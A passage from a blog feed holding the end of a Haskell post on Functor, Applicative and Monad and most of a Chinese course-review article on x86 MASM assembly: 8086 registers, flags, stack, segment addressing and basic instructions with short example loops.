a -&gt; <span class="type">Wrapper</span> a</span><br><span class="line"><span class="title">divideAndAdd2</span> x1 y1 x2 y2 = x1 / y1 + x2 / y2</span><br><span class="line"><span class="comment">--------------------------------------------</span></span><br><span class="line"><span class="title">main</span> = print $ divideAndAdd <span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>总结</h1><p><strong>Functor（函子）</strong>：允许你通过 <code>fmap</code> 或 <code>&lt;$&gt;</code> 将普通函数应用到上下文中的值。</p><p><strong>Applicative（应用函子）</strong>：扩展了 Functor 的概念，通过 <code>&lt;*&gt;</code> 运算符允许在上下文中组合函数。它使得可以处理多个包含上下文的值。</p><p><strong>Monad（单子）</strong>：通过 <code>&gt;&gt;=</code>（绑定运算符）提供了一种链式组合计算的方法，允许在处理前一个计算的结果时定义下一个计算。这对于处理有序的、依赖于之前计算结果的操作至关重要。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/fp/FP-haskell-1/&quot; title=&quot;Haskell(一)入门&quot;&gt;Haskell(一)入门&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/FP-haskell-2/&quot; title=&quot;Haskell(二)函数式编程&quot;&gt;Haskell(二)函数式编程&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/monad/&quot; title=&quot;Haskell(三) Monad&quot;&gt;Haskell(三) Monad&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/Haskell-summary-toolchain/&quot; title=&quot;Haskell(四)总结和工具链&quot;&gt;Haskell(四)总结和工具链&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/Haskell-epilogue/&quot; title=&quot;Haskell(五) 总结和展望&quot;&gt;Haskell(五) 总结和展望&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/project-euler/&quot; title=&quot;Haskell(六) P</summary>
        
      
    
    
    
    <category term="functional language" scheme="https://www.blog-blockchain.xyz/categories/functional-language/"/>
    
    
    <category term="Haskell" scheme="https://www.blog-blockchain.xyz/tags/Haskell/"/>
    
  </entry>
  
  <entry>
    <title>x86汇编基础</title>
    <link href="https://www.blog-blockchain.xyz/cs-courses/x86-masm/"/>
    <id>https://www.blog-blockchain.xyz/cs-courses/x86-masm/</id>
    <published>2023-05-11T12:48:22.000Z</published>
    <updated>2024-11-15T14:30:54.919Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/cs-courses/C-language-basis/" title="C语言基础">C语言基础</a></li><li><a href="/cs-courses/modular-inverses/" title="乘法逆元">乘法逆元</a></li><li><a href="/cs-courses/cpp-cryptographic-algorithm-basis/" title="信息安全算法基础">信息安全算法基础</a></li><li><a href="/cs-courses/OS/" title="操作系统基础">操作系统基础</a></li><li><a href="/cs-courses/x86-masm/" title="x86汇编基础">x86汇编基础</a></li><li><a href="/cs-courses/information-theory/" title="信息论与编码">信息论与编码</a></li></ol></blockquote><p>这是电子科技大学的汇编程序设计的课程复习，由本人总结，主要资源来自 PPT 和自编教材，少部分辅以网上的博客（会给出参考链接）。课程是基于 x86 汇编，汇编语法和汇编器采用 MASM，程序主要是 flat 模式，语法可能和其他的汇编器不同。这篇文章的主要目的是总结和复习，所以可能较为简洁，读者可以在评论区提问，我会不断完善。如果由不准确或者错误的地方，欢迎指正。</p><h1>微处理器和寄存器简介</h1><p>由于汇编需要程序员考虑处理器和寄存器的状态，因此了解基本的内容，有利于理解汇编是如何在 CPU 上工作的。汇编语言与机器语言（字节码）是绑定的，大部分指令直接对应 CPU 的指令，因此汇编不具有可移植性，无法在不同的指令架构下运行。</p><h2 id="CPU-执行指令">CPU 执行指令</h2><p>我们学习 CPU，主要是关注 CPU 内的寄存器、访存方式、输入输出。在计算机组成原理中，我们已经学习过 CPU 的概念图，每次运行：</p><ol><li>取指令（Instruction Fetch）：CPU 发送读取内存的地址，获取指令代码，然后将指令保存在指令寄存器 IR 中。</li><li>指令译码（Instruction Decode）：CPU 将 IR 中的指令中的操作码、操作数、地址等信息解码，然后确定操作数的存储位置、指令要完成的操作以及需要的寄存器等。</li><li>执行指令（Execute）：CPU 会对操作数进行运算或将操作数存储到特定的位置。对于一些需要访问内存或 IO 设备的指令，CPU 会将内存或 IO 设备中的数据读取到 CPU 的寄存器中。(有时候，会把<strong>读取操作数单独作为一个步骤，放在执行指令前</strong>)。</li><li>写回结果（Write Back）：如果是运算指令，CPU 将结果存储到指定的寄存器中；如果是访存指令，CPU 将结果写回到指定的内存地址中。</li></ol><img src="http://cdn.blog-blockchain.xyz/202304211539487.png" alt="image-20230421153931153" style="zoom: 33%;" /><ul><li>GPRs：通用寄存器（General Purpose Registers），在计算机系统中用于存储操作数、地址和控制信息等临时数据的寄存器，是 CPU 内部存储器中的一部分，具有快速读写的特点。</li><li>MAR：存储器地址寄存器（Memory Address Register），用于存储 CPU 将要访问的存储器地址。</li><li>MDR：存储器数据寄存器（Memory Data Register），用于存储 CPU 从存储器中读取的数据或将要写入存储器的数据。</li><li>IR：指令寄存器（Instruction Register），用于存储 CPU 当前执行的指令。</li><li>ALU：算术逻辑单元（Arithmetic Logic Unit），CPU 中用于执行算术和逻辑运算的部件，它可以对多个操作数进行运算并产生结果。</li></ul><h2 id="8086-8088">8086/8088</h2><h3 id="特点和工作模式">特点和工作模式</h3><p>8086/8088 是 Intel 推出的第一款 16 位微处理器，具有以下几个特点：</p><ol><li>采用并行流水线工作方式：8086/8088 将 CPU 划分成多个功能部分，如指令预取队列、指令译码器、算术逻辑部件(ALU)等，并设置<strong>指令预取队列</strong>，实现流水线工作。这种工作方式可以提高 CPU 的运算速度，同时也为后续的 CPU 设计提供了基础。</li><li>对内存空间实行分段管理：8086/8088 采用了分段管理技术，将内存分为多个段并设置<strong>4 个段地址寄存器(CS、DS、ES、SS)，每个段可以达到 64KB，多段寻址可以实现对 1MB 空间的寻址</strong>。通过对不同段进行划分，可以灵活地管理内存空间，同时也为后续的 CPU 设计提供了借鉴。</li><li>支持多处理器系统：8086/8088 可以<strong>通过总线接口支持多处理器系统，可以与其他 8086/8088 或协处理器(Coprocessor)进行通信，实现共享计算资源</strong>，提高系统的运算效率。此外，协处理器也可以<strong>扩展 CPU 的指令集</strong>，增强 CPU 的运算能力。</li></ol><p>8088 有两种工作模式：最大模式和最小模式。<strong>最大模式</strong>是指 CPU<strong>通过外部总线与外围设备进行通信</strong>，包括访问内存、输入输出、中断响应等。在最大模式下，<strong>CPU 需要使用多个芯片来实现外部通信功能</strong>，包括地址数据总线转换芯片、系统计时控制芯片、输入输出控制芯片等。</p><p><strong>最小模式</strong>是指<strong>CPU 不通过外部总线与其他设备进行通信，而是通过芯片组内部的接口实现通信</strong>。在最小模式下，CPU<strong>只需要使用一个称为多路复用器的芯片</strong>来实现地址和数据的<strong>复用</strong>输出，减少了芯片数量和复杂性。</p><h3 id="主要引脚">主要引脚</h3><img src="https://cdn.blog-blockchain.xyz/202304211653166.jpeg" style="zoom: 33%;" /><p>地址引脚：</p><ul><li>AD0-AD7：低 8 位地址和低 8 位数据信号的线。当 CPU 需要从存储器中读取数据时，这些线就是输入数据信号的线；当 CPU 需要将数据写入存储器时，这些线就是输出数据信号的线；当 CPU 需要向存储器发送地址时，这些线就是输出地址信号的线。</li><li>A8-A15：高 8 位地址信号的线。在 8086 中，这些线也用于传输低 8 位数据信号。因为<strong>8086 的总线是 16 位的，8088 是 8 位的</strong>。</li><li>A16-A19/S3-S6：高 4 位地址信号的线，也与状态信号分时复用。这些线用于传输 CPU 的高 4 位地址信号，用于扩展地址空间。<strong>在 8088 中，这些线同时用作状态信号</strong>，用于传输一些特殊的控制信息。<strong>在 8086 中，这些线不用于状态信号</strong>，而是专门用于传输高 4 位地址信号。</li></ul><p>控制引脚：</p><ul><li><p>RD（Read）：读信号，用于从内存或 I/O 设备读取数据。</p></li><li><p>WR（Write）：写信号，用于向内存或 I/O 设备写入数据。</p></li><li><p>IO/M（Input/Output Memory）：指示当前访问的是（0）内存还是（1）I/O 端口。<strong>8086 的信号与 8088（上一句）的相反</strong>。</p></li><li><p>DEN（Data Enable）：数据使能信号，用于表示当前数据线的数据有效。</p></li><li><p>DT/R（Data Transmit/Receive）：数据传输/接收模式选择信号。</p></li><li><p>ALE（Address Latch Enable）：地址锁存使能信号。当其为高电平时，表示地址线上的地址被锁存到一个锁存器中，确保 CPU 在进行读写操作时，始终使用的是同一个地址。</p></li><li><p>READY：用于与外部设备同步。READY 信号的作用是为了控制 CPU 的读写速度，因为 CPU 和外部设备的速度不一定相同。当 CPU 向外部设备请求数据时，外部设备可能还没有准备好数据，如果 CPU 继续读取数据，可能会读到错误的数据。通过 READY 信号，外部设备可以告诉 CPU 何时可以读取数据，确保数据的正确性。</p></li><li><p>RESET 是复位信号，当其为高电平时，CPU 会被强制复位，内部寄存器会被清零或者被设为特定的值，以确保 CPU 从初始状态开始执行。复位后的值如下表：</p></li></ul><table><thead><tr><th><strong>内部寄存器</strong></th><th><strong>内容</strong></th><th><strong>内部寄存器</strong></th><th><strong>内容</strong></th></tr></thead><tbody><tr><td><strong>CS</strong></td><td><strong>FFFFH</strong></td><td><strong>IP</strong></td><td><strong>0000H</strong></td></tr><tr><td><strong>DS</strong></td><td><strong>0000H</strong></td><td><strong>FLAGS</strong></td><td><strong>0000H</strong></td></tr><tr><td><strong>SS</strong></td><td><strong>0000H</strong></td><td><strong>其余寄存器</strong></td><td><strong>0000H</strong></td></tr><tr><td><strong>ES</strong></td><td><strong>0000H</strong></td><td><strong>指令队列</strong></td><td><strong>空</strong></td></tr></tbody></table><h3 id="内部结构和寄存器">内部结构和寄存器</h3><p>大致分为执行单元 EU 和总线接口单元 BIU，重点关注的是<strong>通用寄存器和标志寄存器</strong>，这些寄存器在汇编中会经常用到。</p><img src="http://cdn.blog-blockchain.xyz/202304211730182.png" alt="21819785540 (1)" style="zoom:67%;" /><p>通用寄存器除了可以作为通用的寄存器，用法习惯上也有一些差别：</p><ol><li>AX：<strong>IO 的数据</strong>暂存在这里，<strong>中间运算结果</strong>也存这里。</li><li>BX：<strong>内存寻址</strong>时地址存这里。</li><li>CX：<strong>循环和串操作</strong>存这里，因为串操作常常需要循环。</li><li>DX：存放<strong>I/O 端口地址</strong>还有<strong>32 位除法</strong>的高 16 位。</li><li>SP：表示堆栈指针，日后会详细学习它的计算方法。</li><li>BP：存放栈基址，比如要<strong>访问函数的参数和局部变量</strong>。</li><li>DI 和 SI：一般用于<strong>串操作</strong>，DI 寄存器通常作为目的地址寄存器，SI 寄存器作为源地址寄存器，用于在内存中移动和复制字符串。</li></ol><p>段寄存器在保护模式基本用不到，因为整个内存空间是连续的，了解含义即可。</p><ul><li>IP：下一条要执行指令的地址。</li></ul><p>下面的段寄存器都是存放对应段的基址，在实模式下都是段基址，一个段 64KB。但是保护模式下一个段最大 4GB,段寄存器存储选择子（16 位）的地址，选择子包括段基地址和段属性信息，由操作系统负责将选择子转换成段基地址。</p><ul><li>CS 寄存器（<strong>代码段</strong>寄存器）</li><li>DS 寄存器（<strong>数据段</strong>寄存器）</li><li>ES 寄存器（<strong>附加段</strong>寄存器）</li><li>SS 寄存器（<strong>堆栈段</strong>寄存器）</li></ul><p>实际汇编的时候，是用到 32 位的 flat 模式，也就是寄存器参考下面的 IA-32，主要是理解 EAX、AX、AH、AL 之间的关系，在小端序下的值如何存储。</p><p>IA-32 是 <strong>32</strong> 位处理器，4GB 物理地址空间，64TB 的虚拟地址寻址空间。支持分段、分页的内存管理方式，有<strong>实地址模式、保护模式、虚拟 8086 模式</strong>三种工作方式。</p><img src="https://cdn.blog-blockchain.xyz/202304211719262.png" alt="IA-32寄存器" style="zoom: 67%;" /><h3 id="标志寄存器">标志寄存器</h3><p>标志寄存器在汇编中非常常用，不能手动赋值。标志位的设置和清除是由 CPU 执行指令时自动完成的，程序员可以通过各种指令来检查这些标志位的状态，并根据需要进行相应的操作。许多指令有不同的修改标志寄存器的规定，并且标志寄存器用于提供控制信息。</p><ul><li>CF（进位标志）：最高有效位的<strong>进位或借位</strong>，CF 为 1，否则为 0。</li><li>PF（奇偶标志）：记录结果中 1 的个数的奇偶性。如果结果中<strong>1 的个数为偶数，PF 为 1</strong>，否则为 0。</li><li>AF（辅助进位标志）：记录<strong>低四位的进位或借位</strong>。如果最后一次操作需要进位或借位，AF 为 1，否则为 0。</li><li>ZF（零标志）：记录结果是否为<strong>0</strong>。如果结果为 0，ZF 为 1，否则为 0。</li><li>SF（符号标志）：记录结果的<strong>符号</strong>。如果结果为负数，SF 为 1，否则为 0。</li><li>OF（溢出标志）：记录结果是否<strong>溢出</strong>。如果结果溢出，OF 为 1，否则为 0。</li></ul><p>注意是直接运算来判断标志位，而不是转化成补码后判断标志位。比如溢出标志是根据结果和操作数确定的。以上的标志位需要熟练掌握。</p><p>（<strong>例题</strong>）！！！！！！！！！！！！！！！！！！！！！！！！！！！</p><p>还有 3 个不常用的控制标志位，了解即可：</p><ul><li>TF（跟踪标志）：用于<strong>单步调试</strong>。如果 TF 为 1，则 CPU 在执行一条指令后暂停执行并进入单步调试状态，否则为 0。</li><li>IF（中断标志）：用于控制<strong>可屏蔽中断</strong>的开关。如果 IF 为 1，则 CPU 允许可屏蔽中断，否则为 0。</li><li>DF（方向标志）：用于指示字符串操作指令的方向。如果 DF 为 1，则字符串操作指令向前移动（由高地址到低地址），否则为 0（向后移动，由低地址到高地址）。</li></ul><h3 id="堆栈">堆栈</h3><p>物理地址受限于引脚数量，可以知道最大 20 位，1MB。<strong>一个字两个字节，地址小的字节的地址作为字的地址。小端序，数字低位低地址，字符串顺序存放</strong>。</p><p>逻辑地址分成两部分，16 位段地址，16 位段内地址。通过段地址找到段在内存中的起始位置，通过段内地址找到在段内的偏移量，这样就可以定位一个字节。简单的说，段地址+段内地址就是字节所在的地址。但是<strong>段地址不是随意的，必须是 16 的倍数</strong>，因为规定 16 位为一个小节（Paragraph）。<strong>段最大长度 64KB</strong>。所以，段地址默认低四位为 0，<strong>段寄存器的值需要左移 4 位才是它实际表示的值</strong>。所以，<strong>根据段寄存器和段内偏移量计算地址时，需要注意</strong>。</p><p>堆栈的<strong>最下端是固定的</strong>，叫做栈底。另外一端，叫做栈顶，是最后压栈的元素，SP 就是指向这个元素。SS 指向的是栈所在的存储位置。需要注意：</p><ol><li>栈底是堆栈最下面的字的地址。</li><li>堆栈的每个元素都是字为单位，一层 2 个字节。</li><li><strong>堆栈增长的方向是地址减小的方向</strong>，也就是栈底是高地址，栈顶是低地址。</li><li>SP 的值为与栈开始位置（SS 寄存器的值）的距离，字节为单位。</li><li>SP 初始化时在栈底下面两个字节，也就是栈底的段内相对地址+2，此时为最大值，表示栈为空。</li><li>SP 为 0，表示堆栈满了。</li></ol><img src="http://cdn.blog-blockchain.xyz/202304232012224.png" alt="311634024676480 (1) (1)" style="zoom:50%;" /><p>上面的栈的示意图，是每一层一个字节。</p><h2 id="保护模式的段寻址">保护模式的段寻址</h2><p>主要是学习 IA-32 以后的段寻址的方式，虽然我们主要是使用 flat 32 模式，它是一种特殊的保护模式，不用考虑分段，都是虚拟地址。</p><p>在学习段寄存器时提到，保护模式下段寄存器的内容不是段的起始地址，而是段选择子（也叫做段选择器）的地址，段选择器这个数据结构包括了段基地址和段长等属性。还需要了解一些概念：</p><ul><li>段描述符：每个段对应的元信息，包括段段长、段基地址等信息。</li><li>描述符表：包含了所有内存段的描述符。它可以被认为是一个数组，每个元素就是段描述符。</li><li>段选择器：用于访问描述符表，定位到自己需要的段的描述符。这样获取了段的信息之后，就可以访问段所在的内存了。</li></ul><p><strong>段选择器</strong>的长度就是段寄存器的长度，只有 16 位。</p><ul><li>0-1：RPL，表示优先级，寻址时基本不用注意。</li><li>2：TI，关键位，<strong>0 表示描述符在 GDT 中，1 表示在 LDT 中</strong>。</li><li>3-15：在描述符表中的索引记住时<strong>高 13 位</strong>。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> 15      3   2     0</span><br><span class="line">+----------+-------+</span><br><span class="line">| Index    | TI RPL|</span><br><span class="line">+----------+-------+</span><br></pre></td></tr></table></figure><p><strong>段描述符</strong>为 64 位，下图需要拼起来，第一条是高 32 位，第二条是低 32 位。</p><img src="http://cdn.blog-blockchain.xyz/202304232102139.png" alt="image (1)" style="zoom: 80%;" /><p>比如对于 0x98A46A40 0xAF0FC083，按照上图，段基址应该是 0x9840 AF0F。（顺带吐槽，chatGPT 推理能力真差）。简单的说，高 32 位取头尾字节，低 32 位取头 2 个字节。</p><p>属性中的 <code>G</code> 比较特殊表示粒度，G=1 时单位就变成了 4K，段限长取最大时，一个段就是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>20</mn></msup><mo>∗</mo><mn>4</mn><mi>K</mi><mi>B</mi><mo>=</mo><mn>4</mn><mi>G</mi><mi>B</mi></mrow><annotation encoding="application/x-tex">2^{20}*4KB=4GB</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">20</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">4</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">4</span><span class="mord mathnormal" style="margin-right:0.05017em;">GB</span></span></span></span>。否则单位就是 1 个字节。</p><p><strong>段描述符表</strong>有两个常用的，GDT 是全局描述符表，系统中只有一个。LDT 是局部描述符表，每个进程一个，里面都属局部描述符，是进程使用的段的元信息。可以通过 GDTR 找到 GDT 的位置，但是寻找 LDT 的位置时，需要根据 LGTR 在 GDT 中寻找。<strong>因为 GDTR 是 48 位，LGTR 是 16 位</strong>。在<strong>多任务的 Windows 系统中 LDTR 只有一个</strong>，它用来指示当前任务，当前任务切换时需要改变 LDTR 的内容。</p><p>寻址时，首先从段寄存器获取 16 位的段选择子，看第 3 位的 TI：</p><ul><li>为 0，表示段描述符在 GDT 中。从 <strong>GDTR 中高 32 位是 GDT 的地址</strong>，低 16 位是 GDT 的限长。然后<strong>段选择器的高 13 为是索引地址</strong>，找到段描述符。段描述符的基址寻址，如上面所示。最后再加上段内偏移量即可。</li></ul><p><img src="http://cdn.blog-blockchain.xyz/202304240039936.png" alt="image (1)"></p><ul><li>为 1，表示段描述符在 LDT 中。同样先在 GDT 中找到段描述符，LDTR 的高 13 为 作为索引。但是需要注意，这不再是寻找的字节所在的段的段描述符，而是 LDT 的段描述符，需要根据它寻找 LDT 的起始地址。找到 LDT 起始地址之后，用段选择器的 高 13 位作为索引，就找到了真正的段描述符。</li></ul><p><strong>（例题）！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！</strong></p><h1>指令系统</h1><p>CPU 的指令一般由三部分组成：操作码，表示执行何种操作；目标操作数，存储结果；源操作数，存储参与运算的数据。这三部分不一定是严格区分的，比如 ADD AX BX，AX BX 都是源操作数；再比如 <code>TEST AX BX</code> 表示两个数相与，但是目标操作数并不是 AX 或者 BX，而是只修改标志位。</p><p>操作数有 3 个来源，第一种是硬编码到指令中的<strong>立即数</strong>；第二种是<strong>寄存器</strong>，可以是 8 位（AL、AH）、16 位（AX）、32 位（EAX）；第三种<strong>存储器</strong>，也就是内存，比比如定义数据时的符号地址，或者是寄存器种的地址的值 <code>[AX]</code>。</p><h2 id="寻址方式">寻址方式</h2><ol><li><p>立即数寻址，和国内不同。简单地说就是操作数硬编码到指令。<strong>立即数无法截断，不能超过目的操作数的长度</strong>。比如 <code>MOV AL 260</code> 就会报错，<code>MOV AL 1</code> 其中的 1 就会自动拓展到 8 位。</p></li><li><p>寄存器寻址，操作数都在寄存器中。</p></li><li><p>直接寻址。通过内存地址来访问数据。<strong>内存操作数的长度必须和另一个操作数相同</strong>。</p></li><li><p>寄存器间接寻址。寄存器中是操作数在内存中的地址，然后 <code>[EAX]</code> 就是表示内存中的值。需要注意：</p><ol><li><strong>不能使用 16 位的寄存器存储地址</strong>。</li><li>没有说明长度，默认使用另外另外一个操作数的长度。比如 <code>MOV EAX,1234H,  MOV BX, [EAX]</code> 是读取从 1234H 开始的 2 个字节。</li><li>寄存器都是默认在数据段，只有 EBP 和 ESP 默认在堆栈段。</li><li><strong>保护模式下不能直接访问具体的存储单元</strong>。比如 <code>MOV EAX,1234H,  MOV BX, [EAX]</code> 会报错。使用 <code>MOV BX [1234H]</code> 和 <code>MOVE BX 1234H</code> 是一个效果。</li></ol></li><li><p>寄存器相对寻址。寄存器中的地址，加上一个偏移量来确定地址。它的写法很多，但是<strong>偏移量不能放在括号后面</strong>，一下几种都是等效的。</p><ol><li><code>MOV AX, [EBX+offset]</code></li><li><code>MOV AX, offset[EBX]</code></li><li><code>MOV AX, offset+[EBX]</code> 或者 <code>MOV AX, [EBX]+offset</code></li><li>但是<strong>不能</strong> <code>MOV AX, [EBX]offset</code></li></ol></li><li><p>基址-变址寻址，简单说就是寄存器里的地址可以乘 2、4、8.</p></li><li><p>隐含寻址。一些指令是默认了操作数的来源，比如 <code>MUL BL</code> 省略的另外一个操作数是 AL，结果默认是写入 <code>AX</code>。</p></li></ol><h2 id="常用指令">常用指令</h2><h3 id="数据传送指令">数据传送指令</h3><p>这一类指令<strong>不修改标志位</strong>！</p><h4 id="MOV">MOV</h4><p><code>MOV dest src</code>，表示将 src 的值，复制给 dest，注意是底层的字节序列的赋值。</p><p>MOV 的两个操作数必须长度相同，但是存在以下的几种自动拓展的情况：</p><ol><li>src 是立即数的话，必须小于等于 dest 长度，并且可以拓展。</li><li>内存之间不能直接传送。</li><li>CS 寄存器不能被修改，可以作为 src。</li><li>段寄存器之间不能直接赋值，但是可以通过通用寄存器承接的方式赋值。</li><li>标志寄存器不参与传送。</li><li>一个存储单元，必须要有起始地址及类型（长度）。如果在指令中没给出长度，根据另外一个操作数确定。如果给出长度，两个操作数的长度不能矛盾。</li></ol><img src="http://cdn.blog-blockchain.xyz/202304242028644.png" alt="image-20230424202824549" style="zoom:50%;" /><p>例题：</p><ol><li>MOV AL，BX。长度不一致</li><li>MOV [BX][SI]，AX。内存寻址必须 32 位。</li><li>MOV DS，1000H。立即数无法给段寄存器赋值。</li><li>MOV [1200]，SI。不能直接访问具体的存储单元。</li><li>MOV AX，CS。正确</li><li>MOV DS，CS。段寄存器之间不能直接赋值。</li></ol><h4 id="MOVZX-MOVSX">MOVZX/MOVSX</h4><p>零拓展和符号拓展，可以拓展源操作数，达到目标操作数的长度，然后传送。</p><h4 id="堆栈指令">堆栈指令</h4><p><strong>对于 16 位的实模式</strong>，堆栈指令的操作数<strong>不能是立即数</strong>，可以是 16 位的寄存器或者内存中的一个字，而且必须显式指定长度为一个字。最常见的指令为 <code>PUSH OPRD</code> <code>POP OPRD</code>，操作数必须满足上面的要求。 <code>PUSHF OPRD</code> <code>POPF OPRD</code> 会把标志寄存器的值压入堆栈，然后据一定的规则修改在标志寄存器中的值。</p><p>由于堆栈是 16 位一层，而且 SP 表示和 SS 的距离，所以每次 <code>PUSH</code>，SP = SP-2。再次强调，小端序，栈底高地址。反之 <code>POP</code> 造成 SP=SP+2。</p><p><strong>对于 32 位保护模式</strong>，堆栈元素大小是 32 位，<strong>允许立即数入栈</strong>。新加入了 <code>PUSHA</code> 将 8 个 16 位通用寄存器按 AX、CX、DX、BX、SP、BP、SI 与 DI 的顺序入栈；<code>PUSHAD</code> 则是将这 8 个 32 位寄存器的值顺序入栈。<code>POPA</code> 则相反，将栈顶的 8 个字依次送入 DI、 SI 、BP、 SP 、 BX 、 DX 、CX 与 AX。<code>POPAD</code> 也是类似的。</p><p>同样也有修改标志位的指令，保护模式下的寄存器是 32 为，而实模式下的标志寄存器是 16 为，所以 <code>PUSHFD</code> <code>POPFD</code> 也是类似的，只是标志寄存器变成了 32 位。</p><h4 id="交换指令">交换指令</h4><p>交换指令是一种用于交换两个操作数的值的指令，常见的有 XCHG 指令 <code>XCHG destination, source</code>。这两个操作数必须至少有一个是寄存器，而且不能是段寄存器。</p><h3 id="IO-指令">IO 指令</h3><p>输入输出指令是 CPU 和外设之间进行数据交换的指令，用于完成计算机系统的输入输出操作。输入指令将数据从外设传输到 CPU，输出指令将数据从 CPU 传输到外设。</p><p>输入输出指令一般使用 IN 和 OUT 指令来实现。IN 指令用于将数据从端口读入到寄存器中，OUT 指令用于将寄存器中的数据输出到指定的端口中。这些指令需要指定端口号和数据长度。<code>IN  acc，PORT</code> <code>OUT  PORT，acc</code>。</p><p>回忆寄存器的作用，AX 放 IO 数据，DX 放 IO 地址。根据数据的大小，可以选择 AL、AX、EAX（保护模式）。<code>PORT</code> 可以使用直接寻址和间接寻址，直接寻址就是根据 8 位 <code>PORT</code> 的值寻址，注意是无符号数，范围是 0-255。间接寻址则是超过 255 时，<strong>端口地址只能由 DX 指定</strong>。也就是说，DX 都可以用来寻址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IN  AX，80H</span><br><span class="line">MOV DX，2400H</span><br><span class="line">IN  AL，DX</span><br><span class="line">OUT  35H ，EAX</span><br></pre></td></tr></table></figure><h3 id="取地址指令">取地址指令</h3><p>LEA 的全称是 Load Effective Address（加载有效地址），用于内存单元所在的地址写入寄存器。<code>LEA REG，MEM </code>，源操作数必须是来自内存，目标操作数在保护模式下可以是 32 位寄存器（flat 模式地址都是 32 位）。但是也可以是 <strong>16 位寄存器，只保留地址的低 16 位</strong>，比如 <code>LEA SI, [EDI]</code> SI 中只存储了 EDI 的低 16 位</p><p>LEA 还可以执行加法，比如 <code>LEA  AX, [BX][DI] </code> 是将 <code>BX+DI</code> 送入 AX 中。这是因为 <code>OFFSET</code> 伪指令是不能读取寄存器，所以无法使用寄存器执行加法。</p><p>例题：将数据段中首地址为 MEM1 的 50 个字节的数据传送到同一逻辑段首地址为 MEM2 的区域存放。编写相应的程序段 。</p><p>分析，50 次循环，每次把一个字节传送，同时更新源操作数地址和目的操作数的地址。串操作一般用 SI 和 DI，计数器用 CX，暂存数据用 AX，注意保护模式用 32 位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    LEA ESI, MEM1</span><br><span class="line">    LEA EDI, MEM2</span><br><span class="line">    MOV CL, 50</span><br><span class="line">NEXT:</span><br><span class="line">MOV AL, [ESI];用AL是因为可以指定一个字节</span><br><span class="line">MOV [EDI], AL</span><br><span class="line">INC ESI</span><br><span class="line">INC EDI</span><br><span class="line">DEC CL</span><br><span class="line">JNZ NEXT; DEC 会影响到ZF标志位, CL不为0时 ZF=0，那么就循环</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="标志位操作指令">标志位操作指令</h3><p>标志位操作指令是一类用于修改和操作标志寄存器的指令。这些指令可以用于设置、清除或测试标志位的值。<code>LAHF</code> 全称是 Load AH from Flags，用于将当前的标志寄存器的<strong>低 8 位</strong>拷贝到**<code>AH</code>寄存器**中。<code>SAHF</code>, “Store AH into Flags” 则是相反的作用。</p><h2 id="算术运算">算术运算</h2><p>算术运算指令是用来进行数值运算的汇编指令，大多会影响标志位，特殊的会作特别的说明。</p><h3 id="加法指令">加法指令</h3><p>加法指令得要求和 MOV 指令基本相同，核心是目标操作数要可以写入，两个操作数不能都是来自内存。</p><p>常见的 <code>ADD OPRD1 OPRD2</code> 会影响所有标志位。<code>ADC</code> 指令则会加上 CF 的值，这样实现大整数的相加，因此<strong>初始化时应该 CF 置零</strong>。例如需要完成 20 个字节的操作数的加法，我们就需要「进位加法」：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LEA ESI, M1</span><br><span class="line">LEA EDI, M2</span><br><span class="line">MOV CL, 20</span><br><span class="line">CLC;使得CF为0</span><br><span class="line">NEXT:</span><br><span class="line">MOV AL, [ESI]</span><br><span class="line">ADC AL, [EDI]</span><br><span class="line">INC ESI</span><br><span class="line">INC EDI</span><br><span class="line">DEC CL</span><br><span class="line">JNZ NEXT</span><br></pre></td></tr></table></figure><p><code>INC reg</code> 和 <code>DEC reg</code> 指令在循环中按字节操作时，经常出现，分别是加一和减一。他会<strong>影响除了 CF 